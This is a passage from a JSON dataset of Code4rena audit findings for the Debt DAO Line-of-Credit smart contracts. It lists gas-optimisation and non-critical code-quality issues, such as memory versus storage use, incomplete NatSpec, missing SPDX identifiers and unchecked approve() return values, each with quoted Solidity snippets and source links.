IERC20(sellToken).approve(swapTarget, amount);\n\n/// @audit updateOwner()\n147:        require(ISpigot(spigot).updateOwner(newLine));\n\n/// @audit owner()\n153:        address owner_ = ISpigot(spigot).owner();\n\n/// @audit getSetting()\n170:          (uint8 split,, bytes4 transferFunc) = ISpigot(spigot).getSetting(revenueContract);\n\n/// @audit updateOwnerSplit()\n176:              return ISpigot(spigot).updateOwnerSplit(revenueContract, defaultSplit);\n\n/// @audit updateOwnerSplit()\n179:              return ISpigot(spigot).updateOwnerSplit(revenueContract, MAX_SPLIT);\n\n/// @audit updateOwner()\n196:            if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n\n/// @audit updateOwner()\n201:            if(!ISpigot(spigot).updateOwner(to)) { revert ReleaseSpigotFailed(); }\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L73\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42969",
      "title": "[G-03]  Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "\nWhen fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct\n\n*There are 3 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n205:            Credit memory credit = credits[id];\n\n323:          Credit memory credit = credits[id];\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L205\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n139:        Credit memory credit = credits[id];\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L139\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42968",
      "title": "[G-02]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "\nWhen a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved\n\n*There are 5 instances of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit setting\n125:      function addSpigot(address revenueContract, Setting memory setting) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L125\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit credit\n73      function getOutstandingDebt(\n74        ILineOfCredit.Credit memory credit,\n75        bytes32 id,\n76        address oracle,\n77        address interestRate\n78      )\n79        external\n80:       returns (ILineOfCredit.Credit memory c, uint256 principal, uint256 interest)\n\n/// @audit credit\n168     function repay(\n169       ILineOfCredit.Credit memory credit,\n170       bytes32 id,\n171       uint256 amount\n172     )\n173       external\n174:      returns (ILineOfCredit.Credit memory)\n\n/// @audit credit\n202     function withdraw(\n203       ILineOfCredit.Credit memory credit,\n204       bytes32 id,\n205       uint256 amount\n206     )\n207       external\n208:      returns (ILineOfCredit.Credit memory)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L73-L80\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n/// @audit setting\n125:      function addSpigot(SpigotState storage self, address revenueContract, ISpigot.Setting memory setting) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L125\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42967",
      "title": "[G-01]  State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "\nAvoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). \n\nWhile `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit registry (constructor)\n16:           registry = FeedRegistryInterface(_registry);\n\n/// @audit registry (access)\n29:           ) = registry.latestRoundData(token, Denominations.USD);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L16\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42966",
      "title": "[N-19]  Return values of `approve()` not checked",
      "impact": "LOW",
      "content": "Not all `IERC20` implementations `revert()` when there's a failure in `approve()`. The function signature has a `boolean` return value and they indicate errors that way instead. By not checking the return value, operations that should have marked as failed, may potentially go through without actually approving anything\n\n*There is 1 instance of this issue:*\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit (valid but excluded finding)\n134:              IERC20(sellToken).approve(swapTarget, amount);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L134\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42965",
      "title": "[N-18]  Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "LOW",
      "content": "\nThe compiler will inline the function, which will avoid `JUMP` instructions usually associated with functions.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n259:          require(interestRate.setRate(id, drate, frate));\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L259\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n161:          require(amount > 0);\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L161\n\n_______\n\n## Excluded Non-Critical Issues Findings\n\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness\n\n| |Issue|Instances|\n|-|:-|:-:|\n| [N&#x2011;19] | Return values of `approve()` not checked | 1 |\n\nTotal: 1 instances over 1 issues\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42964",
      "title": "[N-17]  Not using the named return variables anywhere in the function is confusing",
      "impact": "LOW",
      "content": "\nConsider changing the variable to be an unnamed one.\n\n*There are 2 instances of this issue:*\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit claimed\n70        function claimRevenue(address revenueContract, address token, bytes calldata data)\n71            external nonReentrant\n72:           returns (uint256 claimed)\n\n/// @audit claimed\n85        function claimEscrow(address token)\n86            external\n87            nonReentrant\n88:           returns (uint256 claimed) \n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L70-L72\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42963",
      "title": "[N-16]  Event is missing `indexed` fields",
      "impact": "LOW",
      "content": "\nIndex event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each `event` should use three `indexed` fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.\n\n*There are 4 instances of this issue:*\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n21        event MutualConsentRegistered(\n22            bytes32 _consentHash\n23:       );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L21-L23\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n241       event AddSpigot(\n242           address indexed revenueContract,\n243           uint256 ownerSplit\n244:      );\n\n255       event ClaimRevenue(\n256           address indexed token,\n257           uint256 indexed amount,\n258           uint256 escrowed,\n259           address revenueContract\n260:      );\n\n262       event ClaimEscrow(\n263           address indexed token,\n264           uint256 indexed amount,\n265           address owner\n266:      );\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L241-L244\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42962",
      "title": "[N-15]  NatSpec is incomplete",
      "impact": "LOW",
      "content": "\n*There are 56 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n/// @audit Missing: '@param newLine'\n82      /**\n83       * see SecuredlLine.rollover\n84       * @notice helper function to allow borrower to easily swithc collateral to a new Line after repyment\n85       *(@dev priviliegad internal function.\n86       * @dev MUST only be callable if line is REPAID\n87       * @return - if function successfully executed\n88      */\n89:     function _rollover(address newLine) internal virtual returns(bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L82-L89\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n/// @audit Missing: '@return'\n216         @param id - the position id for credit position\n217       */\n218:      function _accrue(Credit memory credit, bytes32 id) internal returns(Credit memory) {\n\n/// @audit Missing: '@param status_'\n415       /**\n416         * @notice - updates `status` variable in storage if current status is diferent from existing status.\n417         * @dev - privileged internal function. MUST check params and logic flow before calling\n418         * @dev - does not save new status if it is the same as current status\n419         * @return status - the current status of the line after updating\n420        */\n421:      function _updateStatus(LineLib.STATUS status_) internal returns(LineLib.STATUS) {\n\n/// @audit Missing: '@return'\n433        * @param amount - amount of tokens lender will initially deposit\n434       */\n435       function _createCredit(\n436           address lender,\n437           address token,\n438           uint256 amount\n439       )\n440           internal\n441:          returns (bytes32 id)\n\n/// @audit Missing: '@param credit'\n456     /**\n457      * @dev - Reduces `principal` and/or `interestAccrued` on a credit line.\n458               Expects checks for conditions of repaying and param sanitizing before calling\n459               e.g. early repayment of principal, tokens have actually been paid by borrower, etc.\n460      * @dev - privileged internal function. MUST check params and logic flow before calling\n461      * @param id - position id with all data pertaining to line\n462      * @param amount - amount of Credit Token being repaid on credit line\n463      * @return credit - position struct in memory with updated values\n464     */\n465       function _repay(Credit memory credit, bytes32 id, uint256 amount)\n466           internal\n467:          returns (Credit memory)\n\n/// @audit Missing: '@param credit'\n/// @audit Missing: '@param id'\n477       /**\n478        * @notice - checks that a credit line is fully repaid and removes it\n479        * @dev deletes credit storage. Store any data u might need later in call before _close()\n480        * @dev - privileged internal function. MUST check params and logic flow before calling\n481        * @return credit - position struct in memory with updated values\n482        */\n483:      function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L216-L218\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n/// @audit Missing: '@return'\n77       * @param targetToken - token in escrow that will be sold of to repay position\n78       */\n79    \n80      function liquidate(\n81        uint256 amount,\n82        address targetToken\n83      )\n84        external\n85        whileBorrowing\n86:       returns(uint256)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L77-L86\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n/// @audit Missing: '@param _line'\n69        /**\n70        * @notice - Allows current owner to transfer ownership to another address\n71        * @dev    - Used if we setup Escrow before Line exists. Line has no way to interface with this function so once transfered `line` is set forever\n72        * @return didUpdate - if function successfully executed or not\n73        */\n74:       function updateLine(address _line) external returns(bool) {\n\n/// @audit Missing: '@return'\n98         * @param token - the token to all borrow to deposit as collateral\n99         */\n100:      function enableCollateral(address token) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L69-L74\n\n```solidity\nFile: contracts/modules/oracle/Oracle.sol\n\n/// @audit Missing: '@param token'\n19        /**\n20         * @return price - the latest price in USD to 8 decimals\n21         */\n22:       function getLatestAnswer(address token) external returns (int) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/oracle/Oracle.sol#L19-L22\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n/// @audit Missing: '@param token'\n57        /**\n58    \n59         * @notice - Claims revenue tokens from the Spigot (push and pull payments) and escrows them for the Owner withdraw later.\n60                   - Calls predefined function in contract settings to claim revenue.\n61                   - Automatically sends portion to Treasury and then escrows Owner's share\n62                   - There is no conversion or trade of revenue tokens. \n63         * @dev    - Assumes the only side effect of calling claimFunc on revenueContract is we receive new tokens.\n64                   - Any other side effects could be dangerous to the Spigot or upstream contracts.\n65         * @dev    - callable by anyone\n66         * @param revenueContract - Contract with registered settings to claim revenue from\n67         * @param data - Transaction data, including function signature, to properly claim revenue on revenueContract\n68         * @return claimed -  The amount of revenue tokens claimed from revenueContract and split between `owner` and `treasury`\n69        */\n70        function claimRevenue(address revenueContract, address token, bytes calldata data)\n71            external nonReentrant\n72:           returns (uint256 claimed)\n\n/// @audit Missing: '@return'\n106        * @param data - tx data, including function signature, to call contract with\n107        */\n108:      function operate(address revenueContract, bytes calldata data) external returns (bool) {\n\n/// @audit Missing: '@return'\n123        * @param setting - Spigot settings for smart contract   \n124        */\n125:      function addSpigot(address revenueContract, Setting memory setting) external returns (bool) {\n\n/// @audit Missing: '@return'\n135        * @param revenueContract - smart contract to transfer ownership of\n136        */\n137       function removeSpigot(address revenueContract)\n138           external\n139:          returns (bool)\n\n/// @audit Missing: '@return'\n157        * @param newOwner - Address to give control to\n158        */\n159:      function updateOwner(address newOwner) external returns (bool) {\n\n/// @audit Missing: '@return'\n168        * @param newOperator - Address to give control to\n169        */\n170:      function updateOperator(address newOperator) external returns (bool) {\n\n/// @audit Missing: '@return'\n179        * @param newTreasury - Address to divert funds to\n180        */\n181:      function updateTreasury(address newTreasury) external returns (bool) {\n\n/// @audit Missing: '@return'\n192        * @param allowed - true/false whether to allow this function to be called by Operator\n193        */\n194:       function updateWhitelistedFunction(bytes4 func, bool allowed) external returns (bool) {\n\n/// @audit Missing: '@return'\n204        * @param token Revenue token that is being garnished from spigots\n205       */\n206:      function getEscrowed(address token) external view returns (uint256) {\n\n/// @audit Missing: '@return'\n213        * @param func Function to check on whitelist \n214       */\n215   \n216:      function isWhitelisted(bytes4 func) external view returns(bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L57-L72\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@param lender'\n/// @audit Missing: '@param token'\n/// @audit Missing: '@return'\n120     /**\n121       * see ILineOfCredit._createCredit\n122       * @notice called by LineOfCredit._createCredit during every repayment function\n123       * @param oracle - interset rate contract used by line that will calculate interest owed\n124      */\n125     function create(\n126         bytes32 id,\n127         uint256 amount,\n128         address lender,\n129         address token,\n130         address oracle\n131     )\n132         external \n133:        returns(ILineOfCredit.Credit memory credit)\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@return'\n163     /**\n164       * see ILineOfCredit._repay\n165       * @notice called by LineOfCredit._repay during every repayment function\n166       * @param credit - The lender position being repaid\n167      */\n168     function repay(\n169       ILineOfCredit.Credit memory credit,\n170       bytes32 id,\n171       uint256 amount\n172     )\n173       external\n174:      returns (ILineOfCredit.Credit memory)\n\n/// @audit Missing: '@param id'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@return'\n197     /**\n198       * see ILineOfCredit.withdraw\n199       * @notice called by LineOfCredit.withdraw during every repayment function\n200       * @param credit - The lender position that is being bwithdrawn from\n201      */\n202     function withdraw(\n203       ILineOfCredit.Credit memory credit,\n204       bytes32 id,\n205       uint256 amount\n206     )\n207       external\n208:      returns (ILineOfCredit.Credit memory)\n\n/// @audit Missing: '@param credit'\n/// @audit Missing: '@param id'\n/// @audit Missing: '@return'\n234     /**\n235       * see ILineOfCredit._accrue\n236       * @notice called by LineOfCredit._accrue during every repayment function\n237       * @param interest - interset rate contract used by line that will calculate interest owed\n238      */\n239     function accrue(\n240       ILineOfCredit.Credit memory credit,\n241       bytes32 id,\n242       address interest\n243     )\n244       public\n245:      returns (ILineOfCredit.Credit memory)\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L120-L133\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n/// @audit Missing: '@param self'\n28        /**\n29         * @notice updates the cratio according to the collateral value vs line value\n30         * @dev calls accrue interest on the line contract to update the latest interest payable\n31         * @param oracle - address to call for collateral token prices\n32         * @return cratio - the updated collateral ratio in 4 decimals\n33        */\n34:       function _getLatestCollateralRatio(EscrowState storage self, address oracle) public returns (uint256) {\n\n/// @audit Missing: '@param self'\n46        /**\n47        * @notice - Iterates over all enabled tokens and calculates the USD value of all deposited collateral\n48        * @param oracle - address to call for collateral token prices\n49        * @return totalCollateralValue - the collateral's USD value in 8 decimals\n50        */\n51:       function _getCollateralValue(EscrowState storage self, address oracle) public returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L28-L34\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n/// @audit Missing: '@param oracle'\n/// @audit Missing: '@param arbiter'\n33        /**\n34          @notice sets up new line based of config of old line. Old line does not need to have REPAID status for this call to succeed.\n35          @dev borrower must call rollover() on `oldLine` with newly created line address\n36          @param oldLine  - line to copy config from for new line.\n37          @param borrower - borrower address on new line\n38          @param ttl      - set total term length of line\n39          @return newLine - address of newly deployed line with oldLine config\n40         */\n41        function rolloverSecuredLine(\n42            address payable oldLine,\n43            address borrower, \n44            address oracle,\n45            address arbiter,\n46            uint ttl\n47:       ) external returns(address) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L33-L47\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n/// @audit Missing: '@return'\n32         * @param amount - amount of tokens to send\n33         */\n34        function sendOutTokenOrETH(\n35          address token,\n36          address receiver,\n37          uint256 amount\n38        )\n39          external\n40:         returns (bool)\n\n/// @audit Missing: '@return'\n57         * @param amount - amount of tokens to send\n58         */\n59        function receiveTokenOrETH(\n60          address token,\n61          address sender,\n62          uint256 amount\n63        )\n64          external\n65:         returns (bool)\n\n/// @audit Missing: '@return'\n78         * @param token - address of token to check. Denominations.ETH for raw ETH\n79        */\n80:       function getBalance(address token) external view returns (uint256) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L32-L40\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n/// @audit Missing: '@param spigot'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param defaultSplit'\n163       /**\n164        * @notice Changes the revenue split between a Borrower's treasury and the LineOfCredit based on line health, runs with updateOwnerSplit()\n165        * @dev    - callable `arbiter` + `borrower`\n166        * @param revenueContract - spigot to update\n167        * @return whether or not split was updated\n168        */\n169:      function updateSplit(address spigot, address revenueContract, LineLib.STATUS status, uint8 defaultSplit) external returns (bool) {\n\n/// @audit Missing: '@param spigot'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param borrower'\n/// @audit Missing: '@param arbiter'\n/// @audit Missing: '@param to'\n186       /**\n187   \n188      * @notice -  Transfers ownership of the entire Spigot and its revenuw streams from its then Owner to either \n189                   the Borrower (if a Line of Credit has been been fully repaid) or \n190                   to the Arbiter (if the Line of Credit is liquidatable).\n191      * @dev    - callable by anyone \n192      * @return - whether or not Spigot was released\n193     */\n194:      function releaseSpigot(address spigot, LineLib.STATUS status, address borrower, address arbiter, address to) external returns (bool) {\n\n/// @audit Missing: '@param to'\n/// @audit Missing: '@param token'\n/// @audit Missing: '@param amount'\n/// @audit Missing: '@param status'\n/// @audit Missing: '@param borrower'\n/// @audit Missing: '@param arbiter'\n211     /**\n212      * @notice -  Sends any remaining tokens (revenue or credit tokens) in the Spigot to the Borrower after the loan has been repaid.\n213                -  In case of a Borrower default (loan status = liquidatable), this is a fallback mechanism to withdraw all the tokens and send them to the Arbiter\n214                -  Does not transfer anything if line is healthy\n215      * @return - whether or not spigot was released\n216     */\n217:      function sweep(address to, address token, uint256 amount, LineLib.STATUS status, address borrower, address arbiter) external returns (bool) {\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L163-L169\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42961",
      "title": "[N-14]  File does not contain an SPDX Identifier",
      "impact": "LOW",
      "content": "\n*There are 16 instances of this issue:*\n```solidity\nFile: contracts/modules/credit/EscrowedLine.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/EscrowedLine.sol#L0\n\n```solidity\nFile: contracts/modules/credit/LineOfCredit.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L0\n\n```solidity\nFile: contracts/modules/credit/SecuredLine.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L0\n\n```solidity\nFile: contracts/modules/credit/SpigotedLine.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SpigotedLine.sol#L0\n\n```solidity\nFile: contracts/modules/escrow/Escrow.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/escrow/Escrow.sol#L0\n\n```solidity\nFile: contracts/modules/factories/LineFactory.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/factories/LineFactory.sol#L0\n\n```solidity\nFile: contracts/modules/interest-rate/InterestRateCredit.sol\n\n0:    pragma solidity ^0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/interest-rate/InterestRateCredit.sol#L0\n\n```solidity\nFile: contracts/modules/spigot/Spigot.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/spigot/Spigot.sol#L0\n\n```solidity\nFile: contracts/utils/CreditLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L0\n\n```solidity\nFile: contracts/utils/CreditListLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditListLib.sol#L0\n\n```solidity\nFile: contracts/utils/EscrowLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/EscrowLib.sol#L0\n\n```solidity\nFile: contracts/utils/LineFactoryLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineFactoryLib.sol#L0\n\n```solidity\nFile: contracts/utils/LineLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L0\n\n```solidity\nFile: contracts/utils/MutualConsent.sol\n\n0:    // forked from https://github.com/IndexCoop/index-coop-smart-contracts/blob/master/contracts/lib/MutualConsent.sol\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L0\n\n```solidity\nFile: contracts/utils/SpigotedLineLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L0\n\n```solidity\nFile: contracts/utils/SpigotLib.sol\n\n0:    pragma solidity 0.8.9;\n\n```\nhttps://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotLib.sol#L0\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Debt DAO",
      "source_link": "https://code4rena.com/reports/2022-11-debtdao",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42960",
      "title": "[N-13]  Non-library/interface files should use fixed compiler versions, not floating ones",
      "impact": "LOW",
